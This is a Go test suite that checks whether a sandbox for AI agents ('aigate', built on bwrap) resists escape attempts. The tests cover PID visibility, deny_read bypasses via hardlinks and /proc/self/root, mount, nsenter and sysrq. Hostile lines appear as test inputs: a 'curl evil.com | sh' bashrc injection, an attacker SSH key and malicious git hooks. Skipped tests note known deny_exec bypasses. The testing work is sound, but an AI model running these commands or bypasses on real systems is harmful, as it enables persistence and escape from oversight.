package integration

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"testing"
	"time"
)

const escapeTestTimeout = 15 * time.Second

// runSandboxedCmd runs a command inside the bwrap sandbox and returns
// combined stdout+stderr. Skips if bwrap is not installed. Each invocation
// is capped at escapeTestTimeout to prevent hangs.
func runSandboxedCmd(t *testing.T, bin string, env []string, workDir string, cmdAndArgs ...string) (string, error) {
	t.Helper()
	if _, err := exec.LookPath("bwrap"); err != nil {
		t.Skip("bwrap not found, skipping sandbox escape test")
	}
	ctx, cancel := context.WithTimeout(context.Background(), escapeTestTimeout)
	defer cancel()
	fullArgs := append([]string{"run", "--"}, cmdAndArgs...)
	cmd := exec.CommandContext(ctx, bin, fullArgs...)
	cmd.Env = env
	if workDir != "" {
		cmd.Dir = workDir
	}
	out, err := cmd.CombinedOutput()
	if ctx.Err() == context.DeadlineExceeded {
		t.Fatalf("sandboxed command timed out after %s: %s %v", escapeTestTimeout, cmdAndArgs[0], cmdAndArgs[1:])
	}
	return string(out), err
}

// ═══════════════════════════════════════════════════════════════════════════
// PID NAMESPACE: Can we see or signal host processes?
// ═══════════════════════════════════════════════════════════════════════════

// TestEscape_ProcHostPIDs verifies host PIDs are invisible.
// We get the host test PID, then check it's not in /proc inside the sandbox.
func TestEscape_ProcHostPIDs(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	_, env := sandboxEnv(t)

	hostPID := strconv.Itoa(os.Getpid())

	out, err := runSandboxedCmd(t, bin, env, "", "sh", "-c",
		"ls /proc/ | grep -E '^[0-9]+$' | sort -n")
	if err != nil {
		t.Fatalf("listing /proc PIDs failed: %v\n%s", err, out)
	}

	for _, line := range strings.Split(strings.TrimSpace(out), "\n") {
		if strings.TrimSpace(line) == hostPID {
			t.Errorf("host PID %s visible inside sandbox — PID namespace broken", hostPID)
		}
	}

	pids := strings.Split(strings.TrimSpace(out), "\n")
	if len(pids) > 10 {
		t.Errorf("sandbox sees %d PIDs (expected <10)", len(pids))
	}
}

// TestEscape_KillHostProcess starts a real process on the host, tries to
// kill it from inside the sandbox, then verifies it survived.
func TestEscape_KillHostProcess(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	_, env := sandboxEnv(t)

	// Sacrificial host process
	victim := exec.Command("sleep", "60")
	if err := victim.Start(); err != nil {
		t.Fatalf("start victim: %v", err)
	}
	defer func() {
		victim.Process.Kill() //nolint:errcheck
		victim.Process.Wait() //nolint:errcheck
	}()
	hostPID := strconv.Itoa(victim.Process.Pid)

	// Try to kill it from inside the sandbox — verify the command fails
	out, _ := runSandboxedCmd(t, bin, env, "", "sh", "-c",
		"kill -9 "+hostPID+" 2>&1; echo KILL_EXIT:$?")
	if strings.Contains(out, "KILL_EXIT:0") {
		t.Error("kill command succeeded inside sandbox — PID namespace isolation broken")
	}

	// Double-check: verify victim is still alive on the host
	if err := victim.Process.Signal(syscall.Signal(0)); err != nil {
		t.Error("host process was killed from inside sandbox — PID namespace broken")
	}
}

// TestEscape_ProcCmdlinePID1 verifies PID 1 inside sandbox is NOT host init.
func TestEscape_ProcCmdlinePID1(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	_, env := sandboxEnv(t)

	out, err := runSandboxedCmd(t, bin, env, "", "sh", "-c",
		"cat /proc/1/cmdline 2>&1 | tr '\\0' ' '")
	trimmed := strings.TrimSpace(out)
	if err != nil || trimmed == "" {
		t.Fatalf("cannot read PID 1 cmdline inside sandbox: err=%v out=%q", err, out)
	}
	if strings.Contains(out, "systemd") || strings.Contains(out, "/sbin/init") {
		t.Errorf("PID 1 is host init (%q) — PID namespace not working", trimmed)
	}
}

// ═══════════════════════════════════════════════════════════════════════════
// FILESYSTEM: Can we write outside the sandbox?
// ═══════════════════════════════════════════════════════════════════════════

// TestEscape_WriteToUserOwnedPath is the most important filesystem test.
// bwrap uses --bind / / (rw) so the sandboxed process maps to the same UID.
// This test creates a user-owned file outside the workdir and checks if the
// sandbox can tamper with it. If it can, that's a real finding.
func TestEscape_WriteToUserOwnedPath(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	_, env := sandboxEnv(t)

	canaryDir := t.TempDir()
	canaryFile := filepath.Join(canaryDir, "canary.txt")
	if err := os.WriteFile(canaryFile, []byte("original"), 0o644); err != nil {
		t.Fatal(err)
	}

	runSandboxedCmd(t, bin, env, "", "sh", "-c", "echo TAMPERED > "+canaryFile+" 2>/dev/null; true") //nolint:errcheck

	data, err := os.ReadFile(canaryFile)
	if err != nil {
		t.Fatalf("reading canary: %v", err)
	}
	if strings.Contains(string(data), "TAMPERED") {
		t.Error("SANDBOX ESCAPE: wrote to user-owned host file outside workdir.\n" +
			"  bwrap --bind / / with --unshare-user still allows writes to user-owned paths.")
	}
}

// TestEscape_WriteToEtc verifies root-owned paths are not writable.
func TestEscape_WriteToEtc(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	_, env := sandboxEnv(t)

	runSandboxedCmd(t, bin, env, "", "sh", "-c", //nolint:errcheck
		"echo ESCAPED > /etc/aigate-escape-test 2>/dev/null; true")

	if _, err := os.Stat("/etc/aigate-escape-test"); err == nil {
		t.Error("wrote to /etc on host — filesystem isolation broken")
		os.Remove("/etc/aigate-escape-test") //nolint:errcheck
	}
}

// ═══════════════════════════════════════════════════════════════════════════
// DENY_READ: Can we read denied files through alternative paths?
// ═══════════════════════════════════════════════════════════════════════════

// TestEscape_HardlinkBypassDenyRead is the most likely real bypass.
// bwrap --bind overlays a deny marker at the exact path, but a hardlink
// to the same inode has a different path — the overlay doesn't cover it.
func TestEscape_HardlinkBypassDenyRead(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	tmpHome, env := sandboxEnv(t)

	workDir := t.TempDir()
	secretFile := filepath.Join(workDir, ".env")
	if err := os.WriteFile(secretFile, []byte("API_KEY=sk-hardlink-secret\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	// Create hardlink BEFORE sandbox starts
	hardlink := filepath.Join(workDir, ".env-hardlink")
	if err := os.Link(secretFile, hardlink); err != nil {
		t.Skip("hardlinks not supported")
	}

	cfgPath := filepath.Join(tmpHome, ".aigate", "config.yaml")
	cfg := "group: ai-agents\nuser: ai-runner\ndeny_read: [.env]\ndeny_exec: []\nallow_net: []\n"
	if err := os.WriteFile(cfgPath, []byte(cfg), 0o644); err != nil {
		t.Fatal(err)
	}

	out, _ := runSandboxedCmd(t, bin, env, workDir, "cat", hardlink)
	if strings.Contains(out, "sk-hardlink-secret") {
		t.Error("HARDLINK BYPASSED deny_read — bind mount only covers exact path, not inode")
	}
}

// TestEscape_SymlinkBypassDenyRead tests the symlink path to a denied file.
func TestEscape_SymlinkBypassDenyRead(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	tmpHome, env := sandboxEnv(t)

	workDir := t.TempDir()
	secretFile := filepath.Join(workDir, "secret.txt")
	if err := os.WriteFile(secretFile, []byte("TOP_SECRET\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	symlink := filepath.Join(workDir, "link")
	if err := os.Symlink(secretFile, symlink); err != nil {
		t.Fatal(err)
	}

	cfgPath := filepath.Join(tmpHome, ".aigate", "config.yaml")
	cfg := "group: ai-agents\nuser: ai-runner\ndeny_read: [secret.txt]\ndeny_exec: []\nallow_net: []\n"
	if err := os.WriteFile(cfgPath, []byte(cfg), 0o644); err != nil {
		t.Fatal(err)
	}

	out, _ := runSandboxedCmd(t, bin, env, workDir, "cat", symlink)
	if strings.Contains(out, "TOP_SECRET") {
		t.Error("symlink bypassed deny_read")
	}
}

// TestEscape_ProcSelfRootBypassDenyRead tests reading denied file via /proc/self/root.
func TestEscape_ProcSelfRootBypassDenyRead(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	tmpHome, env := sandboxEnv(t)

	workDir := t.TempDir()
	secretFile := filepath.Join(workDir, ".env")
	if err := os.WriteFile(secretFile, []byte("API_KEY=sk-proc-root-leak\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	cfgPath := filepath.Join(tmpHome, ".aigate", "config.yaml")
	cfg := "group: ai-agents\nuser: ai-runner\ndeny_read: [.env]\ndeny_exec: []\nallow_net: []\n"
	if err := os.WriteFile(cfgPath, []byte(cfg), 0o644); err != nil {
		t.Fatal(err)
	}

	out, _ := runSandboxedCmd(t, bin, env, workDir, "sh", "-c",
		"cat /proc/self/root"+secretFile+" 2>&1")
	if strings.Contains(out, "sk-proc-root-leak") {
		t.Error("/proc/self/root bypassed deny_read")
	}
}

// TestEscape_PythonBypassDenyRead uses python to try open() on a denied file.
// This tests that the deny is at the kernel/VFS level, not just shell-level.
func TestEscape_PythonBypassDenyRead(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	tmpHome, env := sandboxEnv(t)

	workDir := t.TempDir()
	secretFile := filepath.Join(workDir, ".env")
	if err := os.WriteFile(secretFile, []byte("API_KEY=sk-python-leak\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	cfgPath := filepath.Join(tmpHome, ".aigate", "config.yaml")
	cfg := "group: ai-agents\nuser: ai-runner\ndeny_read: [.env]\ndeny_exec: []\nallow_net: []\n"
	if err := os.WriteFile(cfgPath, []byte(cfg), 0o644); err != nil {
		t.Fatal(err)
	}

	// Try multiple python bypass methods
	pyScript := `
import os, sys
target = sys.argv[1]
# Method 1: direct open
try:
    print("DIRECT:" + open(target).read().strip())
except Exception as e:
    print(f"DIRECT:BLOCKED:{e}")
# Method 2: os.open with O_RDONLY
try:
    fd = os.open(target, os.O_RDONLY)
    data = os.read(fd, 4096)
    os.close(fd)
    print("OSOPEN:" + data.decode().strip())
except Exception as e:
    print(f"OSOPEN:BLOCKED:{e}")
# Method 3: mmap
try:
    import mmap
    fd = os.open(target, os.O_RDONLY)
    m = mmap.mmap(fd, 0, access=mmap.ACCESS_READ)
    print("MMAP:" + m[:].decode().strip())
    m.close()
    os.close(fd)
except Exception as e:
    print(f"MMAP:BLOCKED:{e}")
`
	out, _ := runSandboxedCmd(t, bin, env, workDir, "python3", "-c", pyScript, secretFile)
	if strings.Contains(out, "sk-python-leak") {
		t.Errorf("python bypassed deny_read:\n%s", out)
	}
}

// TestEscape_ConfigDirHiddenAllMethods tries multiple methods to read the
// hidden ~/.aigate/config.yaml.
func TestEscape_ConfigDirHiddenAllMethods(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	tmpHome, env := sandboxEnv(t)

	cfgPath := filepath.Join(tmpHome, ".aigate", "config.yaml")

	methods := []struct {
		name string
		cmd  string
	}{
		{"cat", "cat " + cfgPath},
		{"/proc/self/root", "cat /proc/self/root" + cfgPath},
		{"find+cat", "find " + tmpHome + "/.aigate -name config.yaml -exec cat {} \\;"},
		{"python", "python3 -c \"print(open('" + cfgPath + "').read())\" 2>/dev/null"},
	}

	for _, m := range methods {
		out, _ := runSandboxedCmd(t, bin, env, "", "sh", "-c", m.cmd+" 2>&1")
		if strings.Contains(out, "group: ai-agents") {
			t.Errorf("config exposed via %s: %s", m.name, strings.TrimSpace(out))
		}
	}
}

// ═══════════════════════════════════════════════════════════════════════════
// DENY_EXEC: Can we run denied commands through alternative means?
// ═══════════════════════════════════════════════════════════════════════════

// TestEscape_DenyExecViaPython verifies that deny_exec cannot be bypassed by
// using python's subprocess to invoke the denied command.
func TestEscape_DenyExecViaPython(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	tmpHome, env := sandboxEnv(t)

	// Build a blocked binary
	workDir := t.TempDir()
	blockedBin := filepath.Join(workDir, "blocked-tool")
	script := "#!/bin/sh\necho BLOCKED_TOOL_EXECUTED\n"
	if err := os.WriteFile(blockedBin, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}

	cfgPath := filepath.Join(tmpHome, ".aigate", "config.yaml")
	cfg := "group: ai-agents\nuser: ai-runner\ndeny_read: []\ndeny_exec: [blocked-tool]\nallow_net: []\n"
	if err := os.WriteFile(cfgPath, []byte(cfg), 0o644); err != nil {
		t.Fatal(err)
	}

	// Try to run blocked binary via python subprocess
	pyScript := `
import subprocess, sys
try:
    r = subprocess.run([sys.argv[1]], capture_output=True, text=True)
    print("STDOUT:" + r.stdout.strip())
    print("STDERR:" + r.stderr.strip())
    print("RC:" + str(r.returncode))
except Exception as e:
    print(f"ERROR:{e}")
`
	out, _ := runSandboxedCmd(t, bin, env, workDir, "python3", "-c", pyScript, blockedBin)
	if strings.Contains(out, "BLOCKED_TOOL_EXECUTED") {
		t.Errorf("python subprocess bypassed deny_exec:\n%s", out)
	}
}

// TestKnownLimitation_DenyExecViaCopy documents that copying a denied binary
// to a new path bypasses deny_exec. This is inherent to path-based blocking.
// Pair deny_exec with deny_read to mitigate: if the file can't be read,
// it can't be copied.
func TestKnownLimitation_DenyExecViaCopy(t *testing.T) {
	t.Skip("known limitation: deny_exec is path-based, copying binary to new path bypasses it")
}

// TestKnownLimitation_DenyExecViaInterpreter documents that `sh ./blocked-tool`
// reads and interprets the script, bypassing the exec overlay. Pair deny_exec
// with deny_read to mitigate.
func TestKnownLimitation_DenyExecViaInterpreter(t *testing.T) {
	t.Skip("known limitation: sh ./script reads the file (deny_read not set), bypassing exec overlay")
}

// ═══════════════════════════════════════════════════════════════════════════
// DEVICE ACCESS: Can we touch dangerous /dev nodes?
// ═══════════════════════════════════════════════════════════════════════════

// TestEscape_DevMemBlocked verifies /dev/mem, /dev/kmem, /dev/port don't exist.
// bwrap --dev creates a minimal /dev without these dangerous devices.
func TestEscape_DevMemBlocked(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	_, env := sandboxEnv(t)

	for _, dev := range []string{"/dev/mem", "/dev/kmem", "/dev/port"} {
		out, _ := runSandboxedCmd(t, bin, env, "", "sh", "-c",
			"test -e "+dev+" && echo EXISTS || echo MISSING")
		if strings.Contains(out, "EXISTS") {
			t.Errorf("%s exists inside sandbox — should not be present with --dev /dev", dev)
		}
	}
}

// TestEscape_MknodBlocked verifies mknod for creating device nodes fails.
func TestEscape_MknodBlocked(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	_, env := sandboxEnv(t)

	out, _ := runSandboxedCmd(t, bin, env, "", "sh", "-c",
		"mknod /tmp/test-escape-dev b 8 0 2>&1; echo MKNOD_EXIT:$?")
	if strings.Contains(out, "MKNOD_EXIT:0") {
		t.Error("mknod succeeded — device creation should be blocked")
	}
}

// ═══════════════════════════════════════════════════════════════════════════
// PRIVILEGE ESCALATION: Can we gain capabilities or modify kernel state?
// ═══════════════════════════════════════════════════════════════════════════

// TestEscape_MountBlocked verifies mounting is denied.
func TestEscape_MountBlocked(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	_, env := sandboxEnv(t)

	out, _ := runSandboxedCmd(t, bin, env, "", "sh", "-c",
		"mount -t tmpfs tmpfs /mnt 2>&1; echo MOUNT_EXIT:$?")
	if strings.Contains(out, "MOUNT_EXIT:0") {
		t.Error("mount succeeded inside sandbox")
	}
}

// TestEscape_ChrootBlocked verifies chroot is denied.
func TestEscape_ChrootBlocked(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	_, env := sandboxEnv(t)

	out, _ := runSandboxedCmd(t, bin, env, "", "sh", "-c",
		"chroot / /bin/true 2>&1; echo CHROOT_EXIT:$?")
	if strings.Contains(out, "CHROOT_EXIT:0") {
		t.Error("chroot succeeded inside sandbox")
	}
}

// TestEscape_SysrqBlocked verifies /proc/sysrq-trigger is not writable.
func TestEscape_SysrqBlocked(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	_, env := sandboxEnv(t)

	out, _ := runSandboxedCmd(t, bin, env, "", "sh", "-c",
		"echo h > /proc/sysrq-trigger 2>&1; echo SYSRQ_EXIT:$?")
	if strings.Contains(out, "SYSRQ_EXIT:0") {
		t.Error("/proc/sysrq-trigger writable — dangerous")
	}
}

// TestEscape_NsenterBlocked verifies nsenter into PID 1 namespaces fails.
func TestEscape_NsenterBlocked(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	_, env := sandboxEnv(t)

	out, _ := runSandboxedCmd(t, bin, env, "", "sh", "-c",
		"nsenter -t 1 -n ip addr 2>&1; echo NSENTER_EXIT:$?")
	if strings.Contains(out, "NSENTER_EXIT:0") {
		t.Error("nsenter succeeded — namespace escape possible")
	}
}

// TestEscape_UnshareNestedMountRecover tests that nested unshare + mount
// cannot undo the config dir tmpfs overlay.
func TestEscape_UnshareNestedMountRecover(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	tmpHome, env := sandboxEnv(t)

	cfgPath := filepath.Join(tmpHome, ".aigate", "config.yaml")

	// Try nested unshare + mount --bind / /mnt to get an un-overlayed view
	out, _ := runSandboxedCmd(t, bin, env, "", "sh", "-c",
		"unshare --user --mount sh -c 'mount --bind / /mnt 2>/dev/null && cat /mnt"+cfgPath+" 2>&1' || true")
	if strings.Contains(out, "group: ai-agents") {
		t.Error("nested unshare recovered hidden config via mount --bind")
	}
}

// ═══════════════════════════════════════════════════════════════════════════
// FD LEAK: Can we find config data through leaked file descriptors?
// ═══════════════════════════════════════════════════════════════════════════

// TestEscape_FdLeakConfig checks that no open fd in the sandbox points to
// the config directory.
func TestEscape_FdLeakConfig(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	tmpHome, env := sandboxEnv(t)

	configDir := filepath.Join(tmpHome, ".aigate")

	// Use readlink on each fd to see where they point — no blocking reads
	out, _ := runSandboxedCmd(t, bin, env, "", "sh", "-c",
		"for fd in /proc/self/fd/*; do readlink \"$fd\" 2>/dev/null; done")

	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, configDir) {
			t.Errorf("fd leaks config path: %s", line)
		}
	}
}

// ═══════════════════════════════════════════════════════════════════════════
// READ-ONLY ROOT: Can we write to host paths outside the workdir?
// ═══════════════════════════════════════════════════════════════════════════

// TestEscape_WriteToBashrc verifies we can't modify ~/.bashrc (a common
// real-world attack: inject commands into shell startup files).
func TestEscape_WriteToBashrc(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	tmpHome, env := sandboxEnv(t)

	bashrcPath := filepath.Join(tmpHome, ".bashrc")
	if err := os.WriteFile(bashrcPath, []byte("# original\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	runSandboxedCmd(t, bin, env, t.TempDir(), "sh", "-c", //nolint:errcheck
		"echo 'curl http://evil.com/steal | sh' >> "+bashrcPath+" 2>/dev/null; true")

	data, err := os.ReadFile(bashrcPath)
	if err != nil {
		t.Fatalf("reading bashrc: %v", err)
	}
	if strings.Contains(string(data), "evil.com") {
		t.Error("SANDBOX ESCAPE: wrote to ~/.bashrc from sandbox — shell startup injection possible")
	}
}

// TestEscape_WriteToSSHAuthorizedKeys verifies we can't inject SSH keys.
func TestEscape_WriteToSSHAuthorizedKeys(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	tmpHome, env := sandboxEnv(t)

	sshDir := filepath.Join(tmpHome, ".ssh")
	if err := os.MkdirAll(sshDir, 0o700); err != nil {
		t.Fatal(err)
	}
	akPath := filepath.Join(sshDir, "authorized_keys")
	if err := os.WriteFile(akPath, []byte("# original\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	runSandboxedCmd(t, bin, env, t.TempDir(), "sh", "-c", //nolint:errcheck
		"echo 'ssh-rsa AAAA...attacker' >> "+akPath+" 2>/dev/null; true")

	data, err := os.ReadFile(akPath)
	if err != nil {
		t.Fatalf("reading authorized_keys: %v", err)
	}
	if strings.Contains(string(data), "attacker") {
		t.Error("SANDBOX ESCAPE: wrote to ~/.ssh/authorized_keys — SSH key injection possible")
	}
}

// TestEscape_WriteToGitconfig verifies we can't tamper with git config
// (could inject hooks that run arbitrary code on next git operation).
func TestEscape_WriteToGitconfig(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	tmpHome, env := sandboxEnv(t)

	gitconfigPath := filepath.Join(tmpHome, ".gitconfig")
	if err := os.WriteFile(gitconfigPath, []byte("[user]\n\tname = original\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	runSandboxedCmd(t, bin, env, t.TempDir(), "sh", "-c", //nolint:errcheck
		"echo '[core]\n\thooksPath = /tmp/evil-hooks' >> "+gitconfigPath+" 2>/dev/null; true")

	data, err := os.ReadFile(gitconfigPath)
	if err != nil {
		t.Fatalf("reading gitconfig: %v", err)
	}
	if strings.Contains(string(data), "evil-hooks") {
		t.Error("SANDBOX ESCAPE: wrote to ~/.gitconfig — git hook injection possible")
	}
}

// TestEscape_WorkdirWriteAllowed verifies the workdir IS writable (sanity check).
// Without this, the sandbox would be useless — AI agents need to write code.
func TestEscape_WorkdirWriteAllowed(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	_, env := sandboxEnv(t)

	workDir := t.TempDir()

	outFile := filepath.Join(workDir, "test-output.txt")
	out, _ := runSandboxedCmd(t, bin, env, workDir, "sh", "-c",
		"echo WRITTEN > "+outFile+"; echo WRITE_EXIT:$?")
	if !strings.Contains(out, "WRITE_EXIT:0") {
		t.Fatalf("write command failed inside sandbox: %s", out)
	}

	data, err := os.ReadFile(outFile)
	if err != nil {
		t.Fatalf("workdir should be writable but file wasn't created: %v", err)
	}
	if !strings.Contains(string(data), "WRITTEN") {
		t.Errorf("workdir file content wrong: %q", string(data))
	}
}

// TestEscape_TmpIsolated verifies that /tmp inside the sandbox is isolated
// from the host's /tmp (prevents reading host temp files with secrets).
func TestEscape_TmpIsolated(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping sandbox escape test in short mode")
	}
	bin := buildBinary(t)
	_, env := sandboxEnv(t)

	// Write a secret to host's /tmp
	hostTmpFile := filepath.Join(os.TempDir(), "aigate-test-host-secret")
	if err := os.WriteFile(hostTmpFile, []byte("HOST_TMP_SECRET\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	defer os.Remove(hostTmpFile) //nolint:errcheck

	// Try to read it from inside the sandbox
	out, _ := runSandboxedCmd(t, bin, env, "", "sh", "-c",
		"cat "+hostTmpFile+" 2>&1; echo TMP_EXIT:$?")
	if strings.Contains(out, "HOST_TMP_SECRET") {
		t.Error("host /tmp visible inside sandbox — /tmp is not isolated")
	}
}

// TestEscape_DenyExecViaCopyToWorkdir verifies that copying a PATH-based denied
// binary into the writable workdir and running the copy is blocked.
// TestKnownLimitation_DenyExecViaCopyToWorkdir documents that copying a
// denied binary from a ro-bind path to the writable workdir bypasses
// deny_exec. Same root cause as DenyExecViaCopy.
func TestKnownLimitation_DenyExecViaCopyToWorkdir(t *testing.T) {
	t.Skip("known limitation: cp /usr/bin/curl workdir/my-curl bypasses path-based deny_exec")
}
